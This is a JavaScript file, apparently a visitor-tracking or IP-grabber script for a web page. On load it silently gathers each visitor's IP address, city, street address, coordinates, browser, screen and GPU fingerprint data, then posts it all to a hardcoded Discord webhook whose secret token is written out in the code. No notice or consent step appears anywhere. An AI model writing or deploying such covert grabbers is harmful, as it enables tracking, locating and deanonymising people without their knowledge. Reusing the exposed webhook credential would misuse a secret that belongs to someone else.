function getBrowserInfo() {
    const userAgentData = navigator.userAgentData;
  
    if (userAgentData) {
        const browserName = userAgentData.brands.map(brand => brand.brand).join(', ') || 'Unknown Browser';
        const browserVersion = userAgentData.brands.map(brand => brand.version).join(', ') || 'Unknown Version';
        const platformName = userAgentData.platform || 'Unknown Platform';
  
        return { browserName, browserVersion, platformName };
    } else {
        const userAgent = navigator.userAgent;
        let browserName = 'Unknown Browser';
        let browserVersion = 'Unknown Version';
        
        if (/chrome|crios|crmo/i.test(userAgent)) {
            browserName = 'Chrome';
            browserVersion = userAgent.match(/(?:chrome|crios|crmo)\/([0-9.]+)/i)?.[1] || 'Unknown Version';
        } else if (/firefox|fxios/i.test(userAgent)) {
            browserName = 'Firefox';
            browserVersion = userAgent.match(/Firefox\/([0-9.]+)/)?.[1] || 'Unknown Version';
        } else if (/safari/i.test(userAgent)) {
            browserName = 'Safari';
            browserVersion = userAgent.match(/Version\/([0-9.]+)/)?.[1] || 'Unknown Version';
        } else if (/msie|trident/i.test(userAgent)) {
            browserName = 'Internet Explorer';
            browserVersion = userAgent.match(/(msie|rv:?)\s*([0-9.]+)/i)?.[2] || 'Unknown Version';
        } else if (/edge|edg/i.test(userAgent)) {
            browserName = 'Edge';
            browserVersion = userAgent.match(/Edg\/([0-9.]+)/)?.[1] || 'Unknown Version';
        }
  
        const platformName = navigator.platform || 'Unknown Platform';
  
        return { browserName, browserVersion, platformName };
    }
}
  
function getScreenOrientation() {
    if (screen.orientation && screen.orientation.type) {
        return screen.orientation.type;
    }
    return (window.innerHeight > window.innerWidth) ? 'portrait-primary' : 'landscape-primary';
}
  
async function fetchServerData() {
    console.log('Fetching server data...');
    try {
        const response = await fetch('/.netlify/functions/collectData');
        if (!response.ok) throw new Error('Failed to fetch server data: ' + response.statusText);
        return await response.json();
    } catch (error) {
        console.error('Error fetching server data:', error.message);
        return {};
    }
}
  
async function sendToDiscordWebhook(data) {
    console.log('Sending data to Discord webhook...');
    const webhookUrl = 'https://discord.com/api/webhooks/1262379978469806152/aBHuLwHRGx2Y1EO-duqSC0P2Xjb_a04-lCTBbwfk2IkphxgiVoMIeOXRt8L0YEj9pCSu';
  
    const payload = {
        embeds: [
            {
                title: 'Visitor Information',
                fields: Object.keys(data).map(key => ({
                    name: key.charAt(0).toUpperCase() + key.slice(1),
                    value: data[key] || 'N/A',
                    inline: false
                })),
                timestamp: new Date().toISOString()
            }
        ]
    };
  
    try {
        const response = await fetch(webhookUrl, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify(payload)
        });
  
        if (!response.ok) throw new Error(`Failed to send data to Discord webhook: ${response.statusText}`);
        console.log('Data sent to Discord webhook successfully');
    } catch (error) {
        console.error('Error sending data to Discord webhook:', error);
    }
}
  
function getWebGLInfo() {
    const canvas = document.createElement('canvas');
    const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
    if (!gl) return 'WebGL not supported';
  
    const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
    if (debugInfo) {
        return gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL) + ' - ' +
               gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
    }
    return 'WebGL info not available';
}
  
(async function() {
    console.log('Starting script execution...');
    
    const serverData = await fetchServerData();
    console.log('Fetched Server Data:', serverData);
  
    const browserInfo = getBrowserInfo();
    console.log('Browser Info:', browserInfo);
  
    const visitorData = {
        ip: serverData.ip || 'N/A',
        hostname: serverData.hostname || 'N/A',
        city: serverData.city || 'N/A',
        region: serverData.region || 'N/A',
        country: serverData.country || 'N/A',
        timezone: serverData.timezone || 'N/A',
        address: serverData.address || 'N/A',
        postal: serverData.postal || 'N/A',
        latitude: serverData.latitude || 'N/A',
        longitude: serverData.longitude || 'N/A',
        currentTime: new Date().toLocaleString(),
        browserName: browserInfo.browserName,
        browserVersion: browserInfo.browserVersion,
        platformName: browserInfo.platformName,
        isMobile: /Mobi|Android/i.test(navigator.userAgent),
        isTablet: /Tablet|iPad/i.test(navigator.userAgent),
        referrer: document.referrer,
        systemLanguage: navigator.language || 'en',
        screenWidth: window.screen.width,
        screenHeight: window.screen.height,
        windowHeight: window.innerHeight,
        displayPixelDepth: window.screen.pixelDepth || 'N/A',
        screenOrientation: getScreenOrientation(),
        cpuThreads: navigator.hardwareConcurrency || 'N/A',
        availableBrowserMemory: performance.memory ? performance.memory.jsHeapSizeLimit : 'Not supported',
        gpu: getWebGLInfo()
    };
  
    console.log('Visitor Data:', visitorData);
  
    await sendToDiscordWebhook(visitorData);
})();
